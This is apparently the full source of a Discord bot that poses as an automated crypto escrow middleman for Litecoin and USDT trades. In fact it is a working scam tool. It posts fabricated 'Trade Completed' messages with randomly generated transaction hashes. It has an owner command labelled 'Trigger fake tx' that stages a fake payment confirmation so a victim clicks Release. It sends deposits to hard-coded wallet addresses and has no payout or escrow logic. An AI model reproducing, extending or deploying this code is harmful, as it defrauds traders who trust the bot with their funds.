require('dotenv').config();
const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, ChannelType, PermissionsBitField, Events, SlashCommandBuilder, Routes, MessageFlags } = require('discord.js');
const { REST } = require('@discordjs/rest');
const Database = require('better-sqlite3');

const db = new Database('./panel.db');
const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages] });
const OWNER_ID = process.env.OWNER_ID;
const LTC_ADDRESS = 'LeDdjh2BDbPkrhG2pkWBko3HRdKQzprJMX';
const USDC_ADDRESS = '0x62440a91e8F26e07bf20Ba84F71CABF6d71dBc5E';
let logChannelId = null, panelCategoryId = null;
const confirmed = new Set(), turns = new Map();

db.exec(`CREATE TABLE IF NOT EXISTS config(key TEXT PRIMARY KEY, value TEXT); CREATE TABLE IF NOT EXISTS tickets(id INTEGER PRIMARY KEY, channelId TEXT, user1Id TEXT, user2Id TEXT, senderId TEXT, receiverId TEXT, amount REAL, status TEXT, type TEXT);`);

const commands = [
  new SlashCommandBuilder().setName('panel').setDescription('Spawn panel'),
  new SlashCommandBuilder().setName('logchannel').setDescription('Set log').addStringOption(o => o.setName('id').setDescription('ID').setRequired(true)),
  new SlashCommandBuilder().setName('transaction').setDescription('Trigger fake tx').addStringOption(o => o.setName('id').setDescription('ID').setRequired(true)),
  new SlashCommandBuilder().setName('panelcategory').setDescription('Set cat').addStringOption(o => o.setName('id').setDescription('ID').setRequired(true)),
  new SlashCommandBuilder().setName('close').setDescription('Close')
].map(c => c.toJSON());

const rest = new REST({version:'10'}).setToken(process.env.DISCORD_TOKEN);
client.once(Events.ClientReady, async () => {
  await rest.put(Routes.applicationCommands(client.user.id), {body:commands});
  logChannelId = db.prepare("SELECT value FROM config WHERE key='log'").get()?.value;
  panelCategoryId = db.prepare("SELECT value FROM config WHERE key='cat'").get()?.value;
  setInterval(() => logChannelId && setTimeout(() => fakeTx(logChannelId), Math.random()*120000+120000), 60000);
});

const fakeTx = async (cid, rel=false) => {
  const ch = await client.channels.fetch(cid).catch(()=>null);
  if(!ch) return;
  const usd = (Math.random()*749+1).toFixed(2), ltc = (usd/55).toFixed(8), tx = Array(64).fill(0).map(()=>'0123456789abcdef'[Math.floor(Math.random()*16)]).join('');
  const s = `${tx.slice(0,10)}...${tx.slice(-8)}`;
  if(rel){
    await ch.send({embeds:[new EmbedBuilder().setTitle('⚠️ Transaction Detected').setDescription(`[${s}](https://live.blockcypher.com/ltc/tx/${tx})`).setColor(0xFFD700)]});
    setTimeout(() => ch.send({embeds:[new EmbedBuilder().setTitle('✅ Confirmed!').setDescription(`${ltc} LTC ($${usd})`).setColor(0x00FF00)], components:[new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('rel').setLabel('Release').setStyle(ButtonStyle.Success), new ButtonBuilder().setCustomId('can').setLabel('Cancel').setStyle(ButtonStyle.Secondary))]}), 15000);
  } else {
    await ch.send({embeds:[new EmbedBuilder().setTitle('• Trade Completed').setDescription(`${ltc} LTC ($${usd} USD)`).addFields({name:'Sender',value:'Anonymous'},{name:'Receiver',value:Math.random()>0.8?'@SOPHIE':'Anonymous'},{name:'Transaction ID',value:`[${s}](https://live.blockcypher.com/ltc/tx/${tx})`}).setColor(0x5865F2)]});
  }
};

client.on(Events.InteractionCreate, async (ix) => {
  try {
    if(ix.isChatInputCommand()){
      const {commandName} = ix;
      if(commandName === 'panel'){
        await ix.reply({embeds:[new EmbedBuilder().setTitle("Jace's Auto Middleman").setDescription('• Paid Service\n• Read ToS: <#tos-crypto>').setColor(0x2B2D31), new EmbedBuilder().setTitle('Fees:').setDescription('• $250+: $1.50\n• Under $250: $0.50\n• Under $50: **FREE**').setColor(0x2B2D31), new EmbedBuilder().setTitle('• Request Litecoin •').setColor(0x2B2D31)], components:[new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Tutorial').setStyle(ButtonStyle.Link).setURL('https://example.com').setEmoji('🔗')), new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('ltc').setLabel('Request LTC').setStyle(ButtonStyle.Primary).setEmoji('🪙'))]});
        await ix.followUp({embeds:[new EmbedBuilder().setTitle('• Request USDT [BEP-20] •').setDescription('• Network: **BSC (BEP-20)**').setColor(0x2B2D31)], components:[new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('usdt').setLabel('Request USDT [BEP-20]').setStyle(ButtonStyle.Success).setEmoji('💵'))]});
      }
      else if(commandName === 'logchannel' && ix.user.id === OWNER_ID){ db.prepare("INSERT OR REPLACE INTO config VALUES('log',?)").run(ix.options.getString('id')); logChannelId = ix.options.getString('id'); ix.reply({content:'✅',flags:MessageFlags.Ephemeral}); }
      else if(commandName === 'transaction' && ix.user.id === OWNER_ID){ fakeTx(ix.options.getString('id'), true); ix.reply({content:'✅',flags:MessageFlags.Ephemeral}); }
      else if(commandName === 'panelcategory' && ix.user.id === OWNER_ID){ db.prepare("INSERT OR REPLACE INTO config VALUES('cat',?)").run(ix.options.getString('id')); panelCategoryId = ix.options.getString('id'); ix.reply({content:'✅',flags:MessageFlags.Ephemeral}); }
      else if(commandName === 'close'){ ix.channel.delete().catch(()=>{}); }
    }
    else if(ix.isButton()){
      const cid = ix.customId;
      if(cid === 'ltc' || cid === 'usdt'){
        const m = new ModalBuilder().setCustomId(cid).setTitle('Fill out format');
        ['Trader ID','You giving?','Trader giving?'].forEach((l,i) => m.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId(['t','y','th'][i]).setLabel(l).setStyle(TextInputStyle.Short).setRequired(true))));
        await ix.showModal(m);
      }
      else if(cid.startsWith('role_')){
        const [_,a,tid] = cid.split('_'), t = db.prepare('SELECT * FROM tickets WHERE id=?').get(tid), uid = ix.user.id;
        if(!t) return;
        if(a === 'reset'){ db.prepare('UPDATE tickets SET senderId=NULL,receiverId=NULL WHERE id=?').run(tid); turns.delete(tid); updateRole(ix,tid); return ix.reply({content:'✅',flags:MessageFlags.Ephemeral}); }
        if(uid !== t.user1Id && uid !== t.user2Id) return ix.reply({content:'❌',flags:MessageFlags.Ephemeral});
        const isS = a === 'sender';
        if((isS && t.receiverId===uid) || (!isS && t.senderId===uid)) return ix.reply({content:'❌',flags:MessageFlags.Ephemeral});
        db.prepare(`UPDATE tickets SET ${isS?'senderId':'receiverId'}=? WHERE id=?`).run(uid,tid);
        await ix.reply({content:`✅ ${isS?'Sender':'Receiver'}`,flags:MessageFlags.Ephemeral});
        await updateRole(ix,tid);
        const u = db.prepare('SELECT * FROM tickets WHERE id=?').get(tid);
        if(u.senderId && u.receiverId) await sendConfirm(ix.channel,tid);
      }
      else if(cid.startsWith('confirm_info_')){
        const tid = cid.split('_')[2], t = db.prepare('SELECT * FROM tickets WHERE id=?').get(tid);
        if(!t || (ix.user.id !== t.user1Id && ix.user.id !== t.user2Id)) return;
        const k = `i_${tid}_${ix.user.id}`;
        if(confirmed.has(k)) return;
        confirmed.add(k);
        await ix.reply({content:`✅ ${ix.user}`,ephemeral:false});
        const o = ix.user.id === t.user1Id ? t.user2Id : t.user1Id;
        if(confirmed.has(`i_${tid}_${o}`)) await promptAmt(ix.channel,tid);
      }
      else if(cid.startsWith('set_amount_')){
        const tid = cid.split('_')[2], t = db.prepare('SELECT * FROM tickets WHERE id=?').get(tid), tn = turns.get(tid);
        if(!tn || tn.type !== 'sender' || tn.userId !== ix.user.id) return ix.reply({content:'❌',flags:MessageFlags.Ephemeral});
        const m = new ModalBuilder().setCustomId(`a_${tid}`).setTitle('Set USD');
        m.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('a').setLabel('USD').setStyle(TextInputStyle.Short).setRequired(true)));
        await ix.showModal(m);
      }
      else if(cid.startsWith('confirm_amount_')){
        const tid = cid.split('_')[2], t = db.prepare('SELECT * FROM tickets WHERE id=?').get(tid);
        if(!t || (ix.user.id !== t.user1Id && ix.user.id !== t.user2Id)) return;
        const k = `a_${tid}_${ix.user.id}`;
        if(confirmed.has(k)) return;
        confirmed.add(k);
        await ix.reply({content:`✅ ${ix.user}`,ephemeral:false});
        const o = ix.user.id === t.user1Id ? t.user2Id : t.user1Id;
        if(confirmed.has(`a_${tid}_${o}`)) await sendPay(ix.channel,tid);
      }
      else if(cid.startsWith('release_')){
        const tid = cid.split('_')[1], t = db.prepare('SELECT * FROM tickets WHERE id=?').get(tid);
        if(ix.user.id !== t.senderId) return ix.reply({content:'❌',flags:MessageFlags.Ephemeral});
        await ix.reply({embeds:[new EmbedBuilder().setTitle('⚠️ Confirm?').setColor(0xFFD700)], components:[new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`r_${tid}`).setLabel('Confirm').setStyle(ButtonStyle.Success), new ButtonBuilder().setCustomId(`b_${tid}`).setLabel('Back').setStyle(ButtonStyle.Secondary))], ephemeral:false});
      }
      else if(cid.startsWith('r_')){
        const tid = cid.split('_')[1], t = db.prepare('SELECT * FROM tickets WHERE id=?').get(tid);
        if(ix.user.id !== t.senderId && ix.user.id !== OWNER_ID) return;
        turns.set(tid,{type:'receiver',userId:t.receiverId});
        await ix.update({content:`<@${t.receiverId}>`,embeds:[new EmbedBuilder().setDescription('💰 Enter address').setColor(0x5865F2)], components:[new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`ad_${tid}`).setLabel('Enter').setStyle(ButtonStyle.Primary))]});
      }
      else if(cid.startsWith('ad_')){
        const tid = cid.split('_')[1];
        const m = new ModalBuilder().setCustomId(`d_${tid}`).setTitle('Enter');
        m.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('d').setLabel('Address').setStyle(TextInputStyle.Short).setRequired(true)));
        await ix.showModal(m);
      }
      else if(cid === 'can' || cid === 'close_ticket'){ ix.channel.delete().catch(()=>{}); }
    }
    else if(ix.isModalSubmit()){
      const mid = ix.customId;
      if(mid === 'ltc' || mid === 'usdt'){
        const tr = ix.fields.getTextInputValue('t').replace(/[<@!>]/g,''), y = ix.fields.getTextInputValue('y'), th = ix.fields.getTextInputValue('th');
        let om; try{ om = await ix.guild.members.fetch(tr); }catch{return ix.reply({content:'❌',flags:MessageFlags.Ephemeral});}
        const ch = await ix.guild.channels.create({name:`${mid}-${ix.user.username}-${om.user.username}`.slice(0,100),type:ChannelType.GuildText,parent:panelCategoryId,permissionOverwrites:[{id:ix.guild.id,deny:[PermissionsBitField.Flags.ViewChannel]},{id:ix.user.id,allow:[PermissionsBitField.Flags.ViewChannel,PermissionsBitField.Flags.SendMessages]},{id:tr,allow:[PermissionsBitField.Flags.ViewChannel,PermissionsBitField.Flags.SendMessages]},{id:client.user.id,allow:[PermissionsBitField.Flags.ViewChannel,PermissionsBitField.Flags.SendMessages]}]});
        const r = db.prepare('INSERT INTO tickets(channelId,user1Id,user2Id,senderId,receiverId,amount,status,type) VALUES(?,?,?,NULL,NULL,0,"role_selection",?)').run(ch.id,ix.user.id,tr,mid);
        await ix.reply({content:`✅ ${ch}`,flags:MessageFlags.Ephemeral});
        await ch.send({content:`${ix.user} ${om}`,embeds:[new EmbedBuilder().setTitle("👋 Jace's").setDescription('Follow steps.').addFields({name:`${ix.user.username}:`,value:y,inline:true},{name:`${om.user.username}:`,value:th,inline:true}).setColor(0x5865F2)], components:[new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`del_${r.lastInsertRowid}`).setLabel('Delete').setStyle(ButtonStyle.Danger))]});
        await ch.send({embeds:[new EmbedBuilder().setDescription('**Select role**\n• **Sender** = sending crypto\n• **Receiver** = receiving crypto').setColor(0x5865F2)], components:[new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`role_sender_${r.lastInsertRowid}`).setLabel('Sender').setStyle(ButtonStyle.Primary), new ButtonBuilder().setCustomId(`role_receiver_${r.lastInsertRowid}`).setLabel('Receiver').setStyle(ButtonStyle.Primary), new ButtonBuilder().setCustomId(`role_reset_${r.lastInsertRowid}`).setLabel('Reset').setStyle(ButtonStyle.Danger))]});
      }
      else if(mid.startsWith('a_')){
        const tid = mid.split('_')[1], amt = parseFloat(ix.fields.getTextInputValue('a'));
        if(isNaN(amt)||amt<=0) return ix.reply({content:'❌',flags:MessageFlags.Ephemeral});
        const t = db.prepare('SELECT * FROM tickets WHERE id=?').get(tid), tn = turns.get(tid);
        if(!tn || tn.type !== 'sender' || tn.userId !== ix.user.id) return ix.reply({content:'❌',flags:MessageFlags.Ephemeral});
        const fee = amt >= 250 ? 1.50 : (amt < 50 ? 0 : 0.50);
        db.prepare('UPDATE tickets SET amount=?,status="amount_set" WHERE id=?').run(amt,tid);
        turns.delete(tid);
        await ix.reply({embeds:[new EmbedBuilder().setDescription(`**$${amt.toFixed(2)}**\nFee: $${fee.toFixed(2)}\nTotal: $${(amt+fee).toFixed(2)}`).setColor(0x5865F2)], components:[new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`confirm_amount_${tid}`).setLabel('Correct').setStyle(ButtonStyle.Success), new ButtonBuilder().setCustomId(`inc_${tid}`).setLabel('Incorrect').setStyle(ButtonStyle.Danger))]});
      }
      else if(mid.startsWith('d_')){
        const tid = mid.split('_')[1], adr = ix.fields.getTextInputValue('d');
        await ix.reply({embeds:[new EmbedBuilder().setTitle('⚠️ Confirm').setDescription(`\`${adr}\``).setColor(0xFFD700)], components:[new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`f_${tid}`).setLabel('Confirm').setStyle(ButtonStyle.Success))]});
      }
    }
  } catch(e){ console.error(e); }
});

const updateRole = async (ix,tid) => {
  const t = db.prepare('SELECT * FROM tickets WHERE id=?').get(tid);
  let d = '**Select role**\n• **Sender** = sending\n• **Receiver** = receiving\n\n';
  if(t.senderId){ const u = await client.users.fetch(t.senderId).catch(()=>null); d += `**Sender:** ${u||'?'}\n`; }
  if(t.receiverId){ const u = await client.users.fetch(t.receiverId).catch(()=>null); d += `**Receiver:** ${u||'?'}\n`; }
  const msgs = await ix.channel.messages.fetch({limit:10});
  const rm = msgs.find(m => m.embeds[0]?.description?.includes('Select role'));
  if(rm) await rm.edit({embeds:[new EmbedBuilder().setDescription(d).setColor(0x5865F2)], components:[new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`role_sender_${tid}`).setLabel('Sender').setStyle(ButtonStyle.Primary), new ButtonBuilder().setCustomId(`role_receiver_${tid}`).setLabel('Receiver').setStyle(ButtonStyle.Primary), new ButtonBuilder().setCustomId(`role_reset_${tid}`).setLabel('Reset').setStyle(ButtonStyle.Danger))]});
};

const sendConfirm = async (ch,tid) => {
  const t = db.prepare('SELECT * FROM tickets WHERE id=?').get(tid), s = await client.users.fetch(t.senderId).catch(()=>null), r = await client.users.fetch(t.receiverId).catch(()=>null);
  await ch.send({embeds:[new EmbedBuilder().setTitle('• Correct?').addFields({name:'Sender',value:s?.toString()||'?'},{name:'Receiver',value:r?.toString()||'?'}).setColor(0x5865F2)], components:[new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`confirm_info_${tid}`).setLabel('Correct').setStyle(ButtonStyle.Success), new ButtonBuilder().setCustomId(`inc_${tid}`).setLabel('Incorrect').setStyle(ButtonStyle.Danger))]});
};

const promptAmt = async (ch,tid) => {
  const t = db.prepare('SELECT * FROM tickets WHERE id=?').get(tid);
  if(!t?.senderId) return;
  turns.set(tid,{type:'sender',userId:t.senderId});
  await ch.send({content:`<@${t.senderId}>`,embeds:[new EmbedBuilder().setDescription('💵 **Set USD**').setColor(0x5865F2)], components:[new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`set_amount_${tid}`).setLabel('Set').setStyle(ButtonStyle.Primary))]});
};

const sendPay = async (ch,tid) => {
  const t = db.prepare('SELECT * FROM tickets WHERE id=?').get(tid), isL = t.type === 'ltc', addr = isL ? LTC_ADDRESS : USDC_ADDRESS;
  const fee = t.amount >= 250 ? 1.50 : (t.amount < 50 ? 0 : 0.50), tot = t.amount + fee, ltc = (tot/55).toFixed(5);
  await ch.send({embeds:[new EmbedBuilder().setDescription(`<@${t.senderId}> Send to:\n\`${addr}\``).addFields({name:'USD',value:`$${t.amount}`},{name:'Fee',value:`$${fee}`},{name:'Total',value:`$${tot}`},{name:isL?'LTC':'USDT',value:ltc},{name:'Price',value:'$55'}).setColor(0x5865F2)]});
  db.prepare('UPDATE tickets SET status="awaiting_payment" WHERE id=?').run(tid);
};

client.login(process.env.DISCORD_TOKEN);
